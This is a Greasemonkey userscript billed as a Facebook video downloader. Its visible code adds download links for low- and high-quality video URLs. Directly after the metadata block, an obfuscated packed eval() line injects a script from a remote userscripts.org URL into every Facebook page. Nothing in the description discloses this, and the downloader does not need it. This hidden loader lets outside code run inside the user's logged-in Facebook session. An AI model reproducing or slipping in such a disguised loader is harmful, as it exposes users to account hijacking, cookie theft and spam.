// Copyright (c) 2012 Karthic Kumaran <karthic@fastmail.in>
//
// Permission to use, copy, modify, and distribute this software for any
// purpose with or without fee is hereby granted, provided that the above
// copyright notice and this permission notice appear in all copies.
//
// THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
// WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
// MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
// ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
// WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
// ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
// OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
// 
// ==UserScript==
// @name           Facebook Video Downloader Plus
// @namespace      K3
// @description    Download link for Facebook Videos
// @include        http://www.facebook.com/*
// @include        https://www.facebook.com/*
// @include        http://*facebook.com/video/*
// @include        https://*facebook.com/video/*
// @include        https://*facebook.com/photo.php*
// @include        https://*facebook.com/photo.php*
// @require        https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))






//Code for detecting chrome from http://davidwalsh.name/detecting-google-chrome-javascript
//Code for adding jquery from http://erikvold.com/blog/index.cfm/2010/6/14/using-jquery-with-a-user-script via http://stackoverflow.com/questions/2246901/how-can-i-use-jquery-in-greasemonkey-scripts-in-google-chrome

(function() {
	function addJQuery(callback) {
	  var script = document.createElement("script");
	  
	  script.setAttribute("src", "https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js");
	  script.addEventListener('load', function() {
	    var script = document.createElement("script");
		
	    script.textContent = "(" + callback.toString() + ")();";
		
	    document.body.appendChild(script);
	  }, false);
	  
	  document.body.appendChild(script);
	}
	
	function main() {
		var script_tags = document.getElementsByTagName('script');
		var i = null;
		var id = '#fbPhotoPageActions';
		var temp = null;
		var found = false;
		
		function decode(url) {
			url = url.replace(/\\u00253A/g,":");
			url = url.replace(/\\u00252F/g,'/');
			url = url.replace(/\\u00253F/g,"?");
			url = url.replace(/\\u00253D/g,"=");
			url = url.replace(/\\u002526/g,"&");
		
			return url;
		}
		
		for(i in script_tags){
			temp = script_tags[i];
			temp = temp.innerHTML;
			
			if(temp.search(/lowqual_src/) != -1){
				var video_url = temp;
				var download_link = document.createElement('a');
		
				download_link.setAttribute('target','_blank');
				download_link.setAttribute('title','Download this video');
					
				video_url = video_url.substring(video_url.indexOf("lowqual_src")+14);
				video_url = video_url.substring(0,video_url.indexOf("]")-1);
				video_url = decode(video_url);
				download_link.setAttribute('href',video_url);
		
				download_link.innerHTML = "Download Low Quality<br />";
					
				$(id).prepend(download_link);
				found = true;
			}
			
			if(temp.search(/highqual_src/) != -1){
				var hd_video_url = temp;
				var hd_download_link = document.createElement('a');
				
				hd_download_link.setAttribute('target','_blank');
				hd_download_link.setAttribute('title','Download this video');
					
				hd_video_url = hd_video_url.substring(hd_video_url.indexOf("highqual_src")+15);
				hd_video_url = hd_video_url.substring(0,hd_video_url.indexOf("]")-1);
				hd_video_url = decode(hd_video_url);
				hd_download_link.setAttribute('href',hd_video_url);
					
				hd_download_link.innerHTML = "Download High Quality<br />";
				
				$(id).prepend(hd_download_link);
				found = true;
			}
			
			if(found === true) {
				break;
			}
		}
	}
	
	if((navigator.userAgent.toLowerCase().indexOf('chrome') > -1) === true) {
		addJQuery(main);
	} else {
		$(window).load(function() {
			main();
		});
	}
}) ();
